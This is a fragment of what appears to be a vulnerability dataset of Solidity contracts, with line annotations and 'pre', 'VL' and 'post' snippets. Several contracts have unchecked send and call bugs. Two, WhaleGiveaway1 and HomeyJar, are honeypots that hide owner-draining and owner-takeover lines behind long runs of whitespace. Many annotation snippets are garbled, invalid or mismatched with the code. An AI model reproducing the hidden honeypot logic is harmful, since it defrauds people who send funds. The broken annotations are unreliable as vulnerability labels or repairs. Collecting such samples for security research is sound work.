            "/*\n * @source: https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol\n * @author: -\n * @vulnerable_at_lines: 110,118,132,174\n */\n\n// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address etherAddress;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string name;\n        // How much did they pay to become monarch?\n        uint claimPrice;\n        // When did their rule start (based on block.timestamp)?\n        uint coronationTimestamp;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address wizardAddress;\n\n    // Used to ensure only the wizard can do some things.\n    modifier onlywizard { if (msg.sender == wizardAddress) _; }\n\n    // How much must the first monarch pay?\n    uint constant startingClaimPrice = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant claimPriceAdjustNum = 3;\n    uint constant claimPriceAdjustDen = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant wizardCommissionFractionNum = 1;\n    uint constant wizardCommissionFractionDen = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public currentClaimPrice;\n\n    // The King (or Queen) of the Ether.\n    Monarch public currentMonarch;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public pastMonarchs;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        wizardAddress = msg.sender;\n        currentClaimPrice = startingClaimPrice;\n        currentMonarch = Monarch(\n            wizardAddress,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function numberOfMonarchs() constant returns (uint n) {\n        return pastMonarchs.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address usurperEtherAddress,\n        string usurperName,\n        uint newClaimPrice\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        claimThrone(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function claimThrone(string name) {\n\n        uint valuePaid = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (valuePaid < currentClaimPrice) {\n\n            msg.sender.send(valuePaid);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (valuePaid > currentClaimPrice) {\n            uint excessPaid = valuePaid - currentClaimPrice;\n\n            msg.sender.send(excessPaid);\n            valuePaid = valuePaid - excessPaid;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\n\n        uint compensation = valuePaid - wizardCommission;\n\n        if (currentMonarch.etherAddress != wizardAddress) {\n\n            currentMonarch.etherAddress.send(compensation);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        pastMonarchs.push(currentMonarch);\n        currentMonarch = Monarch(\n            msg.sender,\n            name,\n            valuePaid,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\n        if (rawNewClaimPrice < 10 finney) {\n            currentClaimPrice = rawNewClaimPrice;\n        } else if (rawNewClaimPrice < 100 finney) {\n            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n        } else if (rawNewClaimPrice < 1 ether) {\n            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n        } else if (rawNewClaimPrice < 10 ether) {\n            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n        } else if (rawNewClaimPrice < 100 ether) {\n            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n        } else if (rawNewClaimPrice < 1000 ether) {\n            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n        } else if (rawNewClaimPrice < 10000 ether) {\n            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n        } else {\n            currentClaimPrice = rawNewClaimPrice;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function sweepCommission(uint amount) onlywizard {\n\n        wizardAddress.send(amount);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function transferOwnership(address newOwner) onlywizard {\n        wizardAddress = newOwner;\n    }\n\n}",
            {
                "VL": [
                    117,
                    "require(valuePaid-currentClaimPrice);"
                ],
                "pre": [
                    104,
                    "require(claimThrone(string name) {\n\n        // If the throne is already occupied, reject claim and refund their money.\n        if (currentMonarch.etherAddress!=wizardAddress) {\n\n            msg.sender.send(msg.value);\n            return;\n        }\n\n        // If the throne is vacant, allow them to claim it for free.\n        if(currentMonarch.etherAddress==wizardAddress&&currentMonarch.claimPrice==0) {\n\n            currentMonarch=Monarch(msg.sender,name,0,block.timestamp);\n            ThroneClaimed(currentMonarch.etherAddress,currentMonarch.name,currentClaimPrice);\n            return;\n        }\n\n        // If the throne is vacant, allow them to claim it for free.\n        if(currentMonarch.etherAddress==wizardAddress&&currentMonarch.claimPrice==0) {\n\n            currentMonarch=Monarch(msg.sender,name,0,block.timestamp);\n            ThroneClaimed(currentMonarch.etherAddress,currentMonarch.name,currentClaimPrice);"
                ],
                "post": [
                    169,
                    "require(arch.name,currentClaimPrice));"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol\n * @author: -\n * @vulnerable_at_lines: 110,118,132,174\n */\n\n// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address etherAddress;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string name;\n        // How much did they pay to become monarch?\n        uint claimPrice;\n        // When did their rule start (based on block.timestamp)?\n        uint coronationTimestamp;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address wizardAddress;\n\n    // Used to ensure only the wizard can do some things.\n    modifier onlywizard { if (msg.sender == wizardAddress) _; }\n\n    // How much must the first monarch pay?\n    uint constant startingClaimPrice = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant claimPriceAdjustNum = 3;\n    uint constant claimPriceAdjustDen = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant wizardCommissionFractionNum = 1;\n    uint constant wizardCommissionFractionDen = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public currentClaimPrice;\n\n    // The King (or Queen) of the Ether.\n    Monarch public currentMonarch;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public pastMonarchs;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        wizardAddress = msg.sender;\n        currentClaimPrice = startingClaimPrice;\n        currentMonarch = Monarch(\n            wizardAddress,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function numberOfMonarchs() constant returns (uint n) {\n        return pastMonarchs.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address usurperEtherAddress,\n        string usurperName,\n        uint newClaimPrice\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        claimThrone(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function claimThrone(string name) {\n\n        uint valuePaid = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (valuePaid < currentClaimPrice) {\n\n            msg.sender.send(valuePaid);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (valuePaid > currentClaimPrice) {\n            uint excessPaid = valuePaid - currentClaimPrice;\n\n            msg.sender.send(excessPaid);\n            valuePaid = valuePaid - excessPaid;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\n\n        uint compensation = valuePaid - wizardCommission;\n\n        if (currentMonarch.etherAddress != wizardAddress) {\n\n            currentMonarch.etherAddress.send(compensation);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        pastMonarchs.push(currentMonarch);\n        currentMonarch = Monarch(\n            msg.sender,\n            name,\n            valuePaid,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\n        if (rawNewClaimPrice < 10 finney) {\n            currentClaimPrice = rawNewClaimPrice;\n        } else if (rawNewClaimPrice < 100 finney) {\n            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n        } else if (rawNewClaimPrice < 1 ether) {\n            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n        } else if (rawNewClaimPrice < 10 ether) {\n            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n        } else if (rawNewClaimPrice < 100 ether) {\n            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n        } else if (rawNewClaimPrice < 1000 ether) {\n            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n        } else if (rawNewClaimPrice < 10000 ether) {\n            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n        } else {\n            currentClaimPrice = rawNewClaimPrice;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function sweepCommission(uint amount) onlywizard {\n\n        wizardAddress.send(amount);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function transferOwnership(address newOwner) onlywizard {\n        wizardAddress = newOwner;\n    }\n\n}",
            {
                "VL": [
                    131,
                    "require(etherAddress!=0) {\n            // When the throne is occupied, the fee goes to the previous monarch.\n            currentMonarch.etherAddress.send(compensation);"
                ],
                "pre": [
                    104,
                    "require(claimThrone(string name) {\n\n        // If the throne is already occupied, reject claim and refund their money.\n        if (currentMonarch.etherAddress!=wizardAddress) {\n\n            msg.sender.send(msg.value);\n            return;\n        }\n\n        // If the throne is vacant, allow them to claim it for free.\n        if(currentMonarch.etherAddress==wizardAddress&&currentMonarch.claimPrice==0) {\n\n            currentMonarch=Monarch(msg.sender,name,0,block.timestamp);\n            ThroneClaimed(currentMonarch.etherAddress,currentMonarch.name,currentClaimPrice);\n            return;\n        }\n\n        // If the throne is vacant, allow them to claim it for free.\n        if(currentMonarch.etherAddress==wizardAddress&&currentMonarch.claimPrice==0) {\n\n            currentMonarch=Monarch(msg.sender,name,0,block.timestamp);\n            ThroneClaimed(currentMonarch.etherAddress,currentMonarch.name,currentClaimPrice);"
                ],
                "post": [
                    169,
                    "require(arch.name,currentClaimPrice));"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol\n * @author: -\n * @vulnerable_at_lines: 110,118,132,174\n */\n\n// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address etherAddress;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string name;\n        // How much did they pay to become monarch?\n        uint claimPrice;\n        // When did their rule start (based on block.timestamp)?\n        uint coronationTimestamp;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address wizardAddress;\n\n    // Used to ensure only the wizard can do some things.\n    modifier onlywizard { if (msg.sender == wizardAddress) _; }\n\n    // How much must the first monarch pay?\n    uint constant startingClaimPrice = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant claimPriceAdjustNum = 3;\n    uint constant claimPriceAdjustDen = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant wizardCommissionFractionNum = 1;\n    uint constant wizardCommissionFractionDen = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public currentClaimPrice;\n\n    // The King (or Queen) of the Ether.\n    Monarch public currentMonarch;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public pastMonarchs;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        wizardAddress = msg.sender;\n        currentClaimPrice = startingClaimPrice;\n        currentMonarch = Monarch(\n            wizardAddress,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function numberOfMonarchs() constant returns (uint n) {\n        return pastMonarchs.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address usurperEtherAddress,\n        string usurperName,\n        uint newClaimPrice\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        claimThrone(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function claimThrone(string name) {\n\n        uint valuePaid = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (valuePaid < currentClaimPrice) {\n\n            msg.sender.send(valuePaid);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (valuePaid > currentClaimPrice) {\n            uint excessPaid = valuePaid - currentClaimPrice;\n\n            msg.sender.send(excessPaid);\n            valuePaid = valuePaid - excessPaid;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\n\n        uint compensation = valuePaid - wizardCommission;\n\n        if (currentMonarch.etherAddress != wizardAddress) {\n\n            currentMonarch.etherAddress.send(compensation);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        pastMonarchs.push(currentMonarch);\n        currentMonarch = Monarch(\n            msg.sender,\n            name,\n            valuePaid,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\n        if (rawNewClaimPrice < 10 finney) {\n            currentClaimPrice = rawNewClaimPrice;\n        } else if (rawNewClaimPrice < 100 finney) {\n            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n        } else if (rawNewClaimPrice < 1 ether) {\n            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n        } else if (rawNewClaimPrice < 10 ether) {\n            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n        } else if (rawNewClaimPrice < 100 ether) {\n            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n        } else if (rawNewClaimPrice < 1000 ether) {\n            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n        } else if (rawNewClaimPrice < 10000 ether) {\n            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n        } else {\n            currentClaimPrice = rawNewClaimPrice;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function sweepCommission(uint amount) onlywizard {\n\n        wizardAddress.send(amount);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function transferOwnership(address newOwner) onlywizard {\n        wizardAddress = newOwner;\n    }\n\n}",
            {
                "VL": [
                    173,
                    "require(() onlywizard {\n        uint amount = this.balance/100;\n        if (amount==0) return;\n        if (amount<100finney) return;\n        if (amount>1ether) amount=1ether);"
                ],
                "pre": [
                    173,
                    "require(ission(uint amount) onlywizard {\n        if (amount>this.balance) throw);"
                ],
                "post": [
                    175,
                    "require(       wizardAddress.send(amount);"
                ]
            }
        ]
    ],
    "0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 45\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n    uint constant public minEligibility = 0.999001 ether; \n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function redeem()\n    public\n    payable\n    {                                                                    \n        if(msg.value>=minEligibility)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    44,
                    "require(msg.value>=0);"
                ],
                "pre": [
                    43,
                    "require(msg.value>=0.001ether);"
                ],
                "post": [
                    46,
                    "require(adr.balance>=msg.value);"
                ]
            }
        ]
    ],
    "0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 27\n */\n\npragma solidity ^0.4.19;\ncontract Token {\n    function transfer(address _to, uint _value) returns (bool success);\n    function balanceOf(address _owner) constant returns (uint balance);\n}\ncontract EtherGet {\n    address owner;\n    function EtherGet() {\n        owner = msg.sender;\n    }\n    function withdrawTokens(address tokenContract) public {\n        Token tc = Token(tokenContract);\n        tc.transfer(owner, tc.balanceOf(this));\n    }\n    function withdrawEther() public {\n        owner.transfer(this.balance);\n    }\n    function getTokens(uint num, address addr) public {\n        for(uint i = 0; i < num; i++){\n\n            addr.call.value(0 wei)();\n        }\n    }\n}",
            {
                "VL": [
                    26,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    25,
                    "require(msg.sender==owner);"
                ],
                "post": [
                    29,
                    "require(false);"
                ]
            }
        ]
    ],
    "0x5aa88d2901c68fda244f1d0584400368d2c8e739.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.18;\n\ncontract MultiplicatorX3\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n    \n    function multiplicate(address adr)\n    public\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}",
            {
                "VL": [
                    28,
                    "require(msg.value>=1000000000000000000);"
                ],
                "pre": [
                    27,
                    "require(msg.value>=0.001ether);"
                ],
                "post": [
                    30,
                    "require(msg.sender==adr);"
                ]
            }
        ]
    ],
    "0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.19;\n\ncontract HomeyJar {\n    address public Owner = msg.sender;\n   \n    function() public payable {}\n   \n    function GetHoneyFromJar() public payable {                                              \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data) payable public {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    28,
                    "require(msg.value>0);"
                ],
                "pre": [
                    27,
                    "require(msg.value>0);"
                ],
                "post": [
                    30,
                    "require(adr.call.value(msg.value)(data));"
                ]
            }
        ]
    ],
    "0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 69,71,73,75,102\n */\n\npragma solidity ^0.4.23;\n\ncontract Splitter{\n    \n\taddress public owner;\n\taddress[] public puppets;\n\tmapping (uint256 => address) public extra;\n\taddress private _addy;\n\tuint256 private _share;\n\tuint256 private _count;\n\n\n//constructor\n\n\tconstructor() payable public{\n\t\towner = msg.sender;\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\textra[0] = puppets[0];\n        extra[1] = puppets[1];\n        extra[2] = puppets[2];\n        extra[3] = puppets[3];\n\t}\n\n//withdraw (just in case)\n\t\n\tfunction withdraw() public{\n\t\trequire(msg.sender == owner);\n\t\towner.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction getPuppetCount() public constant returns(uint256 puppetCount){\n    \treturn puppets.length;\n  \t}\n\n//deploy contracts\n\n\tfunction newPuppet() public returns(address newPuppet){\n\t    require(msg.sender == owner);\n    \tPuppet p = new Puppet();\n    \tpuppets.push(p);\n    \treturn p;\n  \t\t}\n \n//update mapping\n\n    function setExtra(uint256 _id, address _newExtra) public {\n        require(_newExtra != address(0));\n        extra[_id] = _newExtra;\n    }\n\n\t\n//fund puppets TROUBLESHOOT gas\n\n    function fundPuppets() public payable {\n        require(msg.sender == owner);\n    \t_share = SafeMath.div(msg.value, 4);\n\n        extra[0].call.value(_share).gas(800000)();\n\n        extra[1].call.value(_share).gas(800000)();\n\n        extra[2].call.value(_share).gas(800000)();\n\n        extra[3].call.value(_share).gas(800000)();\n        }\n        \n//fallback function\n\nfunction() payable public{\n\t}\n}\n\n\ncontract Puppet {\n    \n    mapping (uint256 => address) public target;\n    mapping (uint256 => address) public master;\n\t\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\ttarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\t\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != target[0]){\n\n\t\t\ttarget[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction withdraw() public{\n\t\trequire(msg.sender == master[0]);\n\t\tmaster[0].transfer(address(this).balance);\n\t}\n}\n\n\n//library\n\nlibrary SafeMath {\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}",
            {
                "VL": [
                    68,
                    "require(msg.value>=_share*4);"
                ],
                "pre": [
                    66,
                    "require(msg.value>0);"
                ],
                "post": [
                    76,
                    "require(msg.value==SafeMath.add(SafeMath.add(SafeMath.add(_share,_share),_share),_share));"
                ]
            }
        ],
        [
